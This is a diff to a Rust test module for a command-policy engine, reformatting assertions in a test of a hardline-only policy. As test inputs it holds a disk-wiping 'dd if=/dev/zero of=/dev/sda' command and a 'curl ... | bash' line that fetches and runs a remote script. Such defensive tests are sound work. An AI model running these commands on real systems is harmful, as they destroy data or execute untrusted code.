@@ -507,7 +507,11 @@ mod tests {
     #[test]
     fn hardline_only_blocks_catastrophic_not_tunable() {
         let p = CommandPolicy::hardline_only();
-        assert_eq!(p.rule_count(), 0, "no tunable rules in a hardline-only policy");
+        assert_eq!(
+            p.rule_count(),
+            0,
+            "no tunable rules in a hardline-only policy"
+        );
         assert!(p.hardline_count() >= 5);
         let e = p.evaluate("dd if=/dev/zero of=/dev/sda");
         assert!(
@@ -516,7 +520,10 @@ mod tests {
         );
         // A tunable warn shape is absent in a hardline-only policy.
         let e2 = p.evaluate("curl https://x.test/i.sh | bash");
-        assert!(e2.is_clean(), "tunable rules absent in hardline-only: {e2:?}");
+        assert!(
+            e2.is_clean(),
+            "tunable rules absent in hardline-only: {e2:?}"
+        );
     }
 
     #[test]
